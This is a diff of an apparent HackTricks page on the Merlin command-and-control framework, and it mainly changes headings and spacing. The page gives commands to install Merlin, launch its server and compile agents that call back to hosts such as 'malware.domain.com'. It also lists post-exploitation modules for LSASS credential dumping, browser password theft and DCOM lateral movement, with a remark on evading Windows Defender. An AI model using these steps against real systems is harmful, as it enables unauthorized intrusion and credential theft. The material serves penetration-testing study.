@@ -1,4 +1,4 @@
-# Merlin
+
 
 <details>
 
@@ -16,9 +16,10 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-## Installation
 
-### Install GO
+# Installation
+
+## Install GO
 
 ```
 #Download GO package from: https://golang.org/dl/
@@ -33,24 +34,24 @@ Add "export GOBIN=$GOPATH/bin"
 source /etc/profile
 ```
 
-### Install Merlin
+## Install Merlin
 
 ```
 go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
 cd $GOPATH/src/github.com/Ne0nd0g/merlin/
 ```
 
-## Launch Merlin Server
+# Launch Merlin Server
 
 ```
 go run cmd/merlinserver/main.go -i
 ```
 
-## Merlin Agents
+# Merlin Agents
 
 You can [download precompiled agents](https://github.com/Ne0nd0g/merlin/releases)
 
-### Compile Agents
+## Compile Agents
 
 Go to the main folder _$GOPATH/src/github.com/Ne0nd0g/merlin/_
 
@@ -61,15 +62,16 @@ make windows #Server and Agents for Windows
 make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
 ```
 
-### **Manual compile agents**
+## **Manual compile agents**
 
 ```
 GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
 ```
 
-## Modules
+# Modules
 
-**The bad news is that every module used by Merlin is downloaded from the source (github) and saved indisk before using it. Forge about usingwell known modules because Windows Defender will catch you!**\\
+**The bad news is that every module used by Merlin is downloaded from the source (github) and saved indisk before using it. Forge about usingwell known modules because Windows Defender will catch you!**\
+
 
 **SafetyKatz** --> Modified Mimikatz. Dump LSASS to file and launch:sekurlsa::logonpasswords to that file\
 **SharpDump** --> minidump for the process ID specified (LSASS by default) (Itsais that the extension of the final file is .gz but indeed it is.bin, but is agz file)\
@@ -83,7 +85,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -
 **LaZagneForensic** --> Get browser passwords (works but dont prints the output directory)\
 **dumpCredStore** --> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
 **Get-InjectedThread** --> Detect classic injection in running processes (Classic Injection (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (doesnt works)\
-**Get-OSTokenInformation** --> Get Token Info of the running processes and threads (User, groups, privileges, owner… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token\_information\_class)\
+**Get-OSTokenInformation** --> Get Token Info of the running processes and threads (User, groups, privileges, owner… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
 **Invoke-DCOM** --> Execute a command (inother computer) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
 **Invoke-DCOMPowerPointPivot** --> Execute a command in othe PC abusing PowerPoint COM objects (ADDin)\
 **Invoke-ExcelMacroPivot** --> Execute a command in othe PC abusing DCOM in Excel\
@@ -99,10 +101,11 @@ GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -
 
 **Didn't check persistence modules**
 
-## Resume
+# Resume
 
 I really like the feeling and the potential of the tool.\
 I hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.
+
 
 <details>
 
@@ -119,3 +122,5 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
+
+
